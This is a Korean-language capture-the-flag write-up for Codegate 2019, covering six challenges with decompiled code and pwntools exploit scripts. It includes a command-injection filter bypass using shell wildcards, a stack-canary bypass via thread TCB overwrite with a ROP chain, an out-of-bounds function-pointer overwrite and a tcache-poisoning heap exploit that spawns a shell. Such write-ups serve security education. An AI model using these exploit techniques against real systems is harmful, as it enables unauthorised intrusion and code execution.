# Codegate 2019 Writeup



## 1. MIC Check

- base85 decode

  

## 2. 20000

- 20000개의 library들이 존재하는데, 이 중에서 취약점을 찾아야한다.

  먼저, 주어진 library들을 실행시키는 20000 바이너리를 분석해보면 아래와 같다.

  ```c
  signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
  {
    char *v3; // rax
    signed __int64 result; // rax
    void *v5; // rdi
    char *v6; // rax
    int v7; // [rsp+Ch] [rbp-94h]
    void (__fastcall *v8)(void *, const char *); // [rsp+10h] [rbp-90h]
    void *handle; // [rsp+18h] [rbp-88h]
    char s; // [rsp+20h] [rbp-80h]
    int v11; // [rsp+80h] [rbp-20h]
    int v12; // [rsp+84h] [rbp-1Ch]
    unsigned __int64 v13; // [rsp+88h] [rbp-18h]
  
    v13 = __readfsqword(0x28u);
    sub_400A06(a1, a2, a3);
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
    memset(&s, 0, 0x60uLL);
    v11 = 0;
    printf("INPUT : ", 0LL, &v12);
    __isoc99_scanf("%d", &v7);
    if ( v7 <= 0 && v7 > 20000 )
    {
      printf("Invalid Input");
      exit(-1);
    }
    sprintf(&s, "./20000_so/lib_%d.so", (unsigned int)v7);
    handle = dlopen(&s, 1);
    if ( handle )
    {
      v5 = handle;
      v8 = (void (__fastcall *)(void *, const char *))dlsym(handle, "test");
      if ( v8 )
      {
        v8(v5, "test");
        dlclose(handle);
        result = 0LL;
      }
      else
      {
        v6 = dlerror();
        fprintf(stderr, "Error: %s\n", v6);
        dlclose(handle);
        result = 1LL;
      }
    }
    else
    {
      v3 = dlerror();
      fprintf(stderr, "Error: %s\n", v3);
      result = 1LL;
    }
    return result;
  }
  ```

  

- 해당 libc_%d.so를 가져와 test함수를 실행시키는 방식이므로 아래와 같은 간단한 python 코드를 작성해 Bof와 같은 취약점이 존재하는지 확인해봤다.

  ```python
  from pwn import *
  
  for i in range(1, 20001):
      con = process("./20000")
      con.sendlineafter("INPUT : ", str(i))
      con.sendlineafter("file?", "A" * 0x1000)
      con.interactive()
  ```

  ```bash
  [+] Starting local process './20000': pid 21041
  [*] Switching to interactive mode
  
  [*] Process './20000' stopped with exit code 0 (pid 21041)
  [*] Got EOF while reading in interactive
  $
  [*] Got EOF while sending in interactive
  [+] Starting local process './20000': pid 21045
  [*] Switching to interactive mode
  
  [*] Process './20000' stopped with exit code 0 (pid 21045)
  [*] Got EOF while reading in interactive
  $
  [*] Got EOF while sending in interactive
  [+] Starting local process './20000': pid 21049
  [*] Switching to interactive mode
  
  [*] Got EOF while reading in interactive
  $
  [*] Process './20000' stopped with exit code 0 (pid 21049)
  [*] Got EOF while sending in interactive
  [+] Starting local process './20000': pid 21053
  [*] Switching to interactive mode
  
  [*] Got EOF while reading in interactive
  $
  [*] Process './20000' stopped with exit code 0 (pid 21053)
  [*] Got EOF while sending in interactive
  [+] Starting local process './20000': pid 21057
  [*] Switching to interactive mode
  
  ls: cannot access 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@': No such file or directory
  [*] Process './20000' stopped with exit code 0 (pid 21057)
  [*] Got EOF while reading in interactive
  $
  ```

- 위를 보다시피 lib_5.so파일에서 system 함수를 실행하는 것으로 추정되므로 해당 파일을 디컴파일해서 확인해보면 아래와 같이 lib_5091.so, lib_17470.so에서 filter함수를 얻어온 후, filtering을 거쳐 system함수를 실행한다.

  ```c
  signed __int64 test()
  {
    char *v0; // rax
    signed __int64 result; // rax
    char *v2; // rax
    void (__fastcall *v3)(char *, char *); // [rsp+0h] [rbp-B0h]
    void (__fastcall *v4)(char *); // [rsp+8h] [rbp-A8h]
    void *handle; // [rsp+10h] [rbp-A0h]
    void *v6; // [rsp+18h] [rbp-98h]
    char buf; // [rsp+20h] [rbp-90h]
    __int16 v8; // [rsp+50h] [rbp-60h]
    char s; // [rsp+60h] [rbp-50h]
    __int16 v10; // [rsp+90h] [rbp-20h]
    unsigned __int64 v11; // [rsp+98h] [rbp-18h]
  
    v11 = __readfsqword(0x28u);
    memset(&buf, 0, 0x30uLL);
    v8 = 0;
    memset(&s, 0, 0x30uLL);
    v10 = 0;
    handle = dlopen("./20000_so/lib_5091.so", 1);
    if ( handle )
    {
      v3 = (void (__fastcall *)(char *, char *))dlsym(handle, "filter1");
      v6 = dlopen("./20000_so/lib_17470.so", 1);
      if ( v6 )
      {
        v4 = (void (__fastcall *)(char *))dlsym(v6, "filter2");
        puts("This is lib_5 file.");
        puts("How do you find vulnerable file?");
        read(0, &buf, 0x32uLL);
        v3(&buf, &buf);
        v4(&buf);
        sprintf(&s, "ls \"%s\"", &buf);
        system(&s);
        dlclose(handle);
        dlclose(v6);
        result = 0LL;
      }
      else
      {
        v2 = dlerror();
        fprintf(stderr, "Error: %s\n", v2);
        result = 0xFFFFFFFFLL;
      }
    }
    else
    {
      v0 = dlerror();
      fprintf(stderr, "Error: %s\n", v0);
      result = 0xFFFFFFFFLL;
    }
    return result;
  }
  ```

- 해당 함수를 살펴보면 아래와 같은 필터링을 하게 되는데, 여기서 single character wildcard인 "?"를 검사하지 않아 원하는 명령을 강제로 수행하게 만들어 줄 수 있다.

  ```c
  // lib_5091.so filter1
  char *__fastcall filter1(const char *a1)
  {
    char *result; // rax
  
    if ( strchr(a1, ';') )
      exit(0);
    if ( strchr(a1, '*') )
      exit(0);
    if ( strchr(a1, '|') )
      exit(0);
    if ( strchr(a1, '&') )
      exit(0);
    if ( strchr(a1, '$') )
      exit(0);
    if ( strchr(a1, '`') )
      exit(0);
    if ( strchr(a1, '>') )
      exit(0);
    if ( strchr(a1, '<') )
      exit(0);
    result = strchr(a1, 'r');
    if ( result )
      exit(0);
    return result;
  }
  
  // lib_17470.so filter2
  char *__fastcall filter2(const char *a1)
  {
    char *result; // rax
  
    if ( strchr(a1, 'v') )
      exit(0);
    if ( strchr(a1, 'm') )
      exit(0);
    if ( strchr(a1, 'p') )
      exit(0);
    if ( strchr(a1, 'd') )
      exit(0);
    if ( strchr(a1, 'n') )
      exit(0);
    if ( strstr(a1, "bin") )
      exit(0);
    if ( strstr(a1, "sh") )
      exit(0);
    if ( strstr(a1, "bash") )
      exit(0);
    if ( strchr(a1, 'f') )
      exit(0);
    if ( strchr(a1, 'l') )
      exit(0);
    result = strchr(a1, 'g');
    if ( result )
      exit(0);
    return result;
  }
  ```

- 즉, /bi?/?at ???? (/bin/cat flag)과 같은 공격이 가능해지므로 아래의 공격코드를 구성해서 실행시키면 플래그를 획득할 수 있다.

  ```python
  from pwn import *
  
  con = remote("110.10.147.106", 15959)
  
  con.sendlineafter("INPUT : ", "9")
  con.sendline("\"\n/bi?/?at ????")
  
  con.interactive()
  ```

  

## 3. aeiou

- pthread, tcb, stack canary, buffer overflow

- 문제 바이너리와 libc가 주어졌다. 바이너리는 아래와 같은 mitigation이 걸려있는 것을 볼 수 있다.

  ![1548749970733](C:\Users\newez\AppData\Roaming\Typora\typora-user-images\1548749970733.png)

  

  이제 aeiou 바이너리를 디컴파일해서 분석을 하다보면 아래와 같은 bof가 발생하는 함수를 만나게 된다.

  ```c
  int teach()
  {
    int result; // eax
    pthread_t newthread; // [rsp+0h] [rbp-10h]
    unsigned __int64 v2; // [rsp+8h] [rbp-8h]
  
    v2 = __readfsqword(0x28u);
    pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL);
    result = pthread_join(newthread, 0LL);
    if ( result )
    {
      puts("oooooh :(");
      result = 1;
    }
    return result;
  }
  
  void *__fastcall start_routine(void *a1)
  {
    unsigned __int64 v2; // [rsp+8h] [rbp-1018h]
    char s[4104]; // [rsp+10h] [rbp-1010h]
    unsigned __int64 v4; // [rsp+1018h] [rbp-8h]
  
    v4 = __readfsqword(0x28u);
    memset(s, 0, 0x1000uLL);
    puts("Hello!");
    puts("Let me know the number!");
    v2 = readstr();
    if ( v2 <= 0x10000 )
    {
      sub_401170(0, s, v2);
      puts("Thank You :)");
    }
    else
    {
      puts("Too much :(");
    }
    return 0LL;
  }
  ```

- 이 때, stack canary가 존재해서 leak이 없는 이상 공격이 힘들 것 같지만 canary는 TCB의 특정 8byte를 사용하게 된다. TCB(Thread Control Block)은 thread가 생성될 때마다 thread stack과 같이 생성되며 thread stack 최하단에 존재한다. 그러므로 tcb가 덮힐정도의 overflow를 해주면 해당 thread에서 stack canary를 무력화되게 된다. 아래는 해당 개념을 사용한 공격코드이다.

  ```python
  from pwn import *
  
  debug = True
  
  con = process("./aeiou", env={"LD_PRELOAD": "./libc.so"})
  
  binary = ELF("./aeiou")
  libc = ELF("./libc.so")
  
  con.sendlineafter(">>", "3")
  
  csu_init = 0x4026EA
  trigger = 0x4026D0
  
  payload = ""
  payload += "A" * 0x1018
  payload += p64(csu_init)
  payload += p64(0) #x
  payload += p64(1) #p
  payload += p64(binary.got["read"]) #12
  payload += p64(0x100) #13
  payload += p64(binary.bss() + 0x100) #14
  payload += p64(0) #15
  payload += p64(trigger)
  payload += p64(0x4141) # dummy
  
  payload += p64(0)
  payload += p64(1)
  payload += p64(binary.got["puts"])
  payload += p64(0) * 2
  payload += p64(binary.got["read"])
  payload += p64(trigger)
  payload += p64(0x4141)
  
  payload += p64(0)
  payload += p64(1)
  payload += p64(binary.got["read"])
  payload += p64(0x100)
  payload += p64(binary.bss() + 0x110)
  payload += p64(0)
  payload += p64(trigger)
  payload += p64(0x4141)
  
  payload += p64(0)
  payload += p64(1)
  payload += p64(binary.bss() + 0x110)
  payload += p64(0)
  payload += p64(0)
  payload += p64(binary.bss() + 0x100)
  payload += p64(trigger)
  payload += p64(0x4141)
  
  payload += p64(0) * 6
  payload += p64(0x400E9A)
  
  payload = payload.ljust(0x2000, "A")
  
  con.sendlineafter("number!", str(0x2000))
  con.send(payload)
  
  con.send("/bin/sh\x00")
  con.recvuntil("Thank You :)\n")
  
  # 0x402340
  libcbase = u64(con.recv(8)[:-1].ljust(8, "\x00")) - libc.symbols["read"]
  system = libcbase + libc.symbols["system"]
  oneshot= libcbase + 0x4526a
  malloc_hook = libcbase + libc.symbols["__malloc_hook"]
  
  print "off: {:016x}".format(libc.symbols["read"])
  print "libc: {:016x}".format(libcbase)
  print "system: {:016x}".format(system)
  print "malloc_hook: {:016x}".format(malloc_hook)
  
  con.send(p64(oneshot))
  
  con.interactive()
  ```

  

## 4. archiver

- C++ binary, Out-of-bound

- 해당 바이너리를 분석하기 위해  vtable 구조체와 멤버변수 구조체를 선언을 한 다음, 함수들을 분석해보면 아래의 decompress함수가 보이게 된다.

  ```c++
  __int64 __fastcall Compress::decompress(Compress *compress)
  {
    unsigned __int8 v2; // [rsp+6Ch] [rbp-24h]
    unsigned __int8 v3; // [rsp+6Dh] [rbp-23h]
    char v4; // [rsp+6Eh] [rbp-22h]
    uint8_t v5; // [rsp+6Fh] [rbp-21h]
    unsigned __int64 v6; // [rsp+70h] [rbp-20h]
    __int64 magic; // [rsp+78h] [rbp-18h]
    Compress *v8; // [rsp+80h] [rbp-10h]
    char v9; // [rsp+8Fh] [rbp-1h]
  
    v8 = compress;
    magic = 0LL;
    v6 = 0LL;
    if ( compress->filemanager->vtable->read(compress->filemanager, (char *)&magic, 8LL) & 1 )
    {
      if ( magic == 0x393130322394D3C0LL )
      {
        if ( compress->filemanager->vtable->read(compress->filemanager, (char *)&v6, 8LL) & 1 )
        {
          if ( v6 & 7 )
          {
            v9 = 0;
          }
          else
          {
            while ( 2 )
            {
              if ( 8 * compress->field_1A0 >= v6 )
              {
                v9 = 1;
              }
              else
              {
                compress->filemanager->vtable->read(compress->filemanager, (char *)&v5, 1LL);
                v4 = v5 >> 6;
                switch ( (unsigned __int64)(v5 >> 6) )
                {
                  case 0uLL:
                    if ( compress->vtable->set8byte_by_file(compress, v5 & 0x3F) & 1 )
                      continue;
                    v9 = 0;
                    break;
                  case 1uLL:
                    v3 = v5 & 0x3F;
                    if ( compress->filemanager->vtable->read(compress->filemanager, (char *)&v2, 1LL) & 1 )
                    {
                      if ( compress->vtable->set8byte(compress, v3, v2) & 1 )
                        continue;
                      v9 = 0;
                    }
                    else
                    {
                      v9 = 0;
                    }
                    break;
                  case 2uLL:
                    if ( compress->vtable->clear(compress, v5 & 0x3F) & 1 )
                      continue;
                    v9 = 0;
                    break;
                  case 3uLL:
                    v3 = v5 & 0x3F;
                    if ( compress->vtable->spray_8byte(compress, v5 & 0x3F) & 1 )
                      continue;
                    v9 = 0;
                    break;
                  default:
                    v9 = 0;
                    break;
                }
              }
              break;
            }
          }
        }
        else
        {
          v9 = 0;
        }
      }
      else
      {
        printf("bad magic %p\n", magic);
        v9 = 0;
      }
    }
    else
    {
      v9 = 0;
    }
    return v9 & 1;
  }
  ```

- 위의 코드를 참조해 아래의 파일구조를 사용해야됌을 알 수 있다.

  | File Structure  |
  | :-------------: |
  |      Magic      |
  | compressed_size |
  | compressed data |
  |       ...       |

- decompress를 진행할 때는 compressed data를 파싱해서 파일에서 1byte를 읽어 상위 2bit는 해당 함수들을 실행시키도록 구성되어있고, 필요에 따라서 1byte를 더 읽어 처리하기도 한다.

  각각 함수들을 분석해보면 아래와 같은 함수를 볼 수 있다.

  ```c++
  __int64 __fastcall Compress::set8byte(Compress *a1, unsigned __int8 a2, unsigned __int8 a3)
  {
    char v4; // [rsp+27h] [rbp-1h]
  
    if ( a1->field_1A0 >= (unsigned __int64)a3 )
    {
      a1->field_10[a2] = a1->field_190[a1->field_1A0 - a3];
      v4 = 1;
    }
    else
    {
      v4 = 0;
    }
    return v4 & 1;
  }
  ```

- 위의 함수는 총 2byte를 사용하는 함수이며, a2는 해당 함수를 호출할 때 사용됐던 byte, a3는 추가적으로 읽은 byte를 사용하게 된다. 즉, field_10 배열의 max index(0~47)보다 큰 곳을 참조할 수 있게 되므로 field_190에 원하는 8byte 값을 저장해둔다음 아래의 Compress 구조체가 보여주는 것처럼 uncompress_msg 함수 포인터를 덮어씌워주면 된다.

  ```c++
  struct FileManager
  {
    vtable *vtable;
    std::istream *istream;
    __int64 offset;
  };
  
  struct Compress
  {
    vtable_compress *vtable;
    FileManager *filemanager;
    __int64 field_10[48]; // overflow possible
    uint64_t *field_190;
    __int64 field_198;
    __int64 field_1A0;
    __int64 uncompressed_size;
    void (__fastcall *uncompressed_msg)(__int64); // target
  };
  ```

- 해당 바이너리에는 win이라는 system함수를 실행시켜주는 함수가 존재하므로 해당 함수 주소를 field_190에 저장해둔 뒤 overflow를 시켜주면 될 것이다.

  ```python
  from pwn import *
  
  con = remote("110.10.147.111", 4141)
  
  size = 0x400 - 0x50
  
  ar = p64(0x393130322394D3C0)	# magic
  ar += p64(size)				# compress_size
  
  # save uncompressed_msg in heap
  for i in range(0x39):
  	ar += p8(0b11000000 | 0b00110100)	# spray 8byte (0x34)
  
  # uncompressed_size overwrite
  ar += p8(0b01000000 | 0b00110011)
  ar += p8(0x01)
  
  for i in range(0x21):
  	ar += p8(0b01000000 | 0b00110011)
  	ar += p8(0x01)
  
  #r = size - len(ar) - 3
  for i in range(0x39):
  	ar += p8(0b11000000 | 0b00110011) # spray system("cat flag")
  
  # uncompressed_msg overwrite
  ar += p8(0b01000000 | 0b00110100)
  ar += p8(0x01)
  
  ar += p8(0x41)
  
  print len(ar)
  
  with open("payload", "wb") as f:
  	f.write(ar)
  
  con.send(p32(len(ar)))
  con.send(ar)
  
  con.interactive()
  ```

  

## 5. PyProt3ct

- python vm reversing

- 문제에서 2개의 python 파일, byte code binary를 제공한다. 해당 파일들을 분석하기 위해 play.py를 먼저 살펴보면 난독화가 되어있는 것을 볼 수 있다.

  ```python
  # ...
  def O0O0O0O00OO0O0O0O(OOO0OO0O000O0OOOO ,OOO0O0000OOOO0OO0):
      O0O0O0000OO0OOO0O=dict()
      OOOO0000OOO0OOO0O=1000
      OOOO0OO00OOOO000O=1001
      O00OOO0O00OOOOO0O=2001
      OO0OO00000000O00O=2002
      O0OO0OO0000O0O0OO=2003
      O0O000OOO0OOOO0OO=2004
      O000OOO00OOO0O00O=0
      OOO0OO0OO0OOO00O0=1
      O0OOOOOOOOO00OOOO=2
      OO0O0O0000000O00O=3
      OOO0OO00OOOO0O0OO=4
      O00OO0OO0O0O00OOO=5
      O0O0O0000OO0OOO0O[OOOO0000OOO0OOO0O]=0
      O0O0O0000OO0OOO0O[OOOO0OO00OOOO000O]=0
      O0O0O0000OO0OOO0O["flag"]=OOO0O0000OOOO0OO0
      OOO000O0O0OOO0OOO=0
      while OOO000O0O0OOO0OOO==0:
          O00OOO00000OO0OOO=O0O0O0000OO0OOO0O[OOOO0000OOO0OOO0O]
          OO0OO0OOOOO00OO00=OOO0OO0O000O0OOOO[O00OOO00000OO0OOO]
          O00OOO00000OO0OOO=O00OOO00000OO0OOO+OOO0OO0OO0OOO00O0
          OO000O0OOOOOOO0OO=OOO0OO0O000O0OOOO[O00OOO00000OO0OOO]
          O00OOO00000OO0OOO=O00OOO00000OO0OOO+OOO0OO0OO0OOO00O0
  # ...
  ```

- 먼저 분석에 용이하도록 각각 함수들을 func%d 형태로 작성해주고 변수들또한 renaming을 해준 뒤, 각각 함수들이 하는 일들을 print를 통해 출력하고 파일로 뽑아냈다.

  ![1548755053246](C:\Users\newez\AppData\Roaming\Typora\typora-user-images\1548755053246.png)

- 해당 파일을 분석하기 위해서 열어보면 수많은 명령어들이 수행됐던 것을 볼 수 있는데, 의미 없는 대입 연산을 제거하여 패턴을 파악하기 쉽게 만들고, 코드의 중첩되는 부분을 함수형태로 생각하게 되면서 빠르게 분석이 가능해졌다. 코드들을 분석한 뒤, 암호화를 아래의 python코드로 구성했다

  ```python
  from pwn import *
  
  def calc(value):
  	# high dword stub
  	a = value >> 32
  	b = a ^ 0xffc2bdec
  	c = b + 0xffc2bdec
  	d = c & 0xffffffff
  	high = d
  
  	# low dword stub
  	e = value & 0xffffffff
  	f = e ^ 0xffc2bdec
  	g = f + 0xffc2bdec
  	h = g & 0xffffffff
  	low = h
  
  	v = ((low << 32) | high)
  	byte = v & 0xff
  	print hex(value), hex(v & 0xffffffffffffffff), hex((byte << 57) & 0xffffffffffffffff), hex((v >> 7) & 0xffffffffffffffff)
  	return ((v >> 7) | (byte << 57)) & 0xffffffffffffffff
  
  def getHash(flag):
  	assert len(flag) == 8
  
  	value = u64(flag[::-1])
  	for i in range(0x7f):
  		value = calc(value)
  	return value
  
  print hex(getHash("AAAAAAAA"))
  ```

- 위의 암호화는 상위, 하위 4byte를 특정 연산 후 뒤집어 저장하는 형태를 가지며, v의 하위 1byte를 최상의 byte로 가져온다. 이 때 1bit는 하위에 계속 머물게 된다. 이 연산은 어느정도 최종값을 알고 있다면 역연산이 가능할 것으로 보여 분석을 해봤다.

- 먼저 하위 1 bit의 처리를 해야하는데, 이는 msB가 홀수일 경우, 나머지 7byte에서 8byte쪽에 0x01을 or시켜주면 된다. 이렇게 처리하면 이전에 사용한 값을 구할 수 있게 된다.

  ```python
  msb = r & 0xff00000000000000
  etc = r & 0x00ffffffffffffff
  
  a = ((msb >> 56) & 0xff)
  if a % 2 == 1:
      etc |= 0x0100000000000000
  
  byte = (msb >> 57) & 0x7f
  value = (etc << 7) | byte
  ```

- 해당 값(value)을 상위, 하위 4byte로 low, high로 받아와준 뒤, calc함수에서 처음에 진행한 연산을 역연산해서 다시 조합해주면 그 이전 상태의 값이 나오게 된다.

  ```python
  high, low = value & 0xffffffff, (value >> 32) & 0xffffffff
  
  high = (((high - 0xffc2bdec) & 0xffffffff) ^ 0xffc2bdec) << 32
  low = ((low - 0xffc2bdec) & 0xffffffff) ^ 0xffc2bdec
  return high | low
  ```

- 그러므로 총 127번 위의 과정을 반복해주면 암호화 이전 값이 나오게 될 것이다. 아래는 최종 복호화 코드다.

  ```python
  from pwn import *
  
  def calc(value):
  	# high dword stub
  	a = value >> 32
  	b = a ^ 0xffc2bdec
  	c = b + 0xffc2bdec
  	d = c & 0xffffffff
  	high = d
  
  	# low dword stub
  	e = value & 0xffffffff
  	f = e ^ 0xffc2bdec
  	g = f + 0xffc2bdec
  	h = g & 0xffffffff
  	low = h
  
  	v = ((low << 32) | high)
  	byte = v & 0xff
  	print hex(value), hex(v & 0xffffffffffffffff), hex((byte << 57) & 0xffffffffffffffff), hex((v >> 7) & 0xffffffffffffffff)
  	return ((v >> 7) | (byte << 57)) & 0xffffffffffffffff
  
  def getHash(flag):
  	assert len(flag) == 8
  
  	value = u64(flag[::-1])
  	for i in range(0x7f):
  		value = calc(value)
  	return value
  
  def revcalc(r):
  	msb = r & 0xff00000000000000
  	etc = r & 0x00ffffffffffffff
  
  	a = ((msb >> 56) & 0xff)
  	if a % 2 == 1:
  		etc |= 0x0100000000000000
  
  	byte = (msb >> 57) & 0x7f
  	value = (etc << 7) | byte
  	high, low = value & 0xffffffff, (value >> 32) & 0xffffffff
  
  	high = (((high - 0xffc2bdec) & 0xffffffff) ^ 0xffc2bdec) << 32
  	low = ((low - 0xffc2bdec) & 0xffffffff) ^ 0xffc2bdec
  	return high | low
  
  def getHashRev(value):
  	for i in range(127):
  		value = revcalc(value)
  	return p64(value)[::-1]
  
  print getHashRev(0xd274a5ce60ef2dca)
  ```

  flag: d34dPY27

  

## 6. god-the-reum

- glibc heap exploit(tcache)

- 이 문제는 tcache가 적용된 libc-2.27.so가 사용되었다. 기존 heap exploit기법들에 추가적으로 공격가능한 게 추가되었는데, 이는 tcache bin이 사용되는 걸 악용해야한다. 주어진 바이너리를 분석해보자.

  ```c
  __int64 __fastcall main(__int64 a1, char **a2, char **a3)
  {
    int v3; // ST18_4
    int v4; // ST18_4
    int v6; // ST18_4
    char v7[88]; // [rsp+20h] [rbp-60h]
    unsigned __int64 v8; // [rsp+78h] [rbp-8h]
    __int64 savedregs; // [rsp+80h] [rbp+0h]
  
    v8 = __readfsqword(0x28u);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 2, 0LL);
    while ( 1 )
    {
      printmenu();
      while ( getchar() != 10 )
        ;
      switch ( (unsigned int)&savedregs )
      {
        case 1u:
          create_wallet((wallet *)&v7[16 * wallet_count]);
          break;
        case 2u:
          v3 = sub_11DC();
          deposit((wallet *)&v7[16 * v3]);
          break;
        case 3u:
          v4 = sub_11DC();
          withdraw((wallet *)&v7[16 * v4]);
          break;
        case 4u:
          show((__int64)v7);
          break;
        case 5u:
          puts("bye da.");
          return 0LL;
        case 6u:
          v6 = sub_11DC();
          sub_1092((wallet *)&v7[16 * v6]);
          break;
        default:
          sub_11B3();
          break;
      }
    }
  }
  ```

- 위와 같은 main이 주어지며 wallet을 생성하고 입금, 지불, 확인을 할 수 있고 추가적으로 관리자 기능이 존재한다.  create_wallet을 통해 구조체를 얻을 수 있다.

  ```c
  struct wallet
  {
    char *addr;		// malloc(0x82)
    _QWORD *balance;	// malloc(input_balance)
  };
  
  ```

- 그리고 free가 되는 곳은 withdraw함수인데, 현재 가지고 있는 balance를 전부 소진(0이 돼야함)해야한다. 그리고 show함수에서는 wallet_count만큼 wallet을 출력해주므로 free(balance)가 된 wallet도 출력을 해주게 된다.

- 하지만 이는 tcache bin에 들어갈 수 있는 크기(max tcache bin size: 0x408)이면 main_arena와의 unlink를 진행하지 않는다. 그러므로 어느정도 큰값을 할당시켜 free시켜주면 main_arena의 주소가 leak된다.

- 그리고 tcache bin의 특성상 실제로 free하지 않고 포인터를 가지고 있는데, heap chunk fd, bk에 해당하는 영역에 next chunk 주소가 들어가게 된다. 이는 다음 malloc(fastbin_size) 시, 참조하여 fd부분에 존재하는 next chunk를 그 다음 할당할 주소로 지정해준다. 이를 악용한 공격이 tcache_poisoning이다.

- 아래는 해당 기법을 사용해 구성한 공격 코드이다.

  ```python
  from pwn import *
  
  debug = False
  
  if debug:
  	con = process("./godeth")
  else:
  	#con = process("./godeth", env={"LD_PRELOAD":"./libc-2.27.so"})
  	con = remote("110.10.147.103", 10001)
  
  def create(balance):
  	con.sendlineafter("choice : ", "1")
  	con.sendlineafter("how much initial eth? : ", str(balance))
  
  def deposit(idx, balance):
  	con.sendlineafter("choice : ", "2")
  	con.sendlineafter("input wallet no : ", str(idx))
  	con.sendlineafter("how much deposit? : ", str(balance))
  
  def withdraw(idx, balance):
  	con.sendlineafter("choice : ", "3")
  	con.sendlineafter("input wallet no : ", str(idx))
  	con.sendlineafter("how much you wanna withdraw? : ", str(balance))
  
  def show():
  	con.sendlineafter("choice : ", "4")
  	return con.recvuntil("\n\n")
  
  def dev(idx, balance):
  	con.sendlineafter("choice : ", "6")
  	con.sendlineafter("input wallet no : ", str(idx))
  	con.sendlineafter("new eth : ", balance)
  
  if debug:
  	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  	oneshot = 0x4f2c5
  else:
  	libc = ELF("./libc-2.27.so")
  	oneshot = 0x10a38c
  
  create(0x1000)
  create(0x80)
  
  withdraw(0, 0x1000)
  withdraw(1, 0x80)
  withdraw(1, 0x00)
  
  leak = show().split("\n")
  heap = int(leak[2].split(", ballance ")[1])
  main_arena = int(leak[1].split(", ballance ")[1]) - 96
  libc_base = main_arena - (libc.symbols["__malloc_hook"] + 0x10)
  free_hook = libc_base + libc.symbols["__free_hook"]
  oneshot = libc_base + oneshot
  print "heap: {:016x}".format(heap)
  print "main_arena: {:016x}".format(main_arena)
  print "libc: {:016x}".format(libc_base)
  print "free_hook: {:016x}".format(free_hook)
  print "oneshot: {:016x}".format(oneshot)
  
  dev(1, p64(free_hook))
  
  create(0x80)
  
  dev(2, p64(oneshot))
  
  withdraw(0, main_arena + 96)
  
  con.interactive()
  ```

  
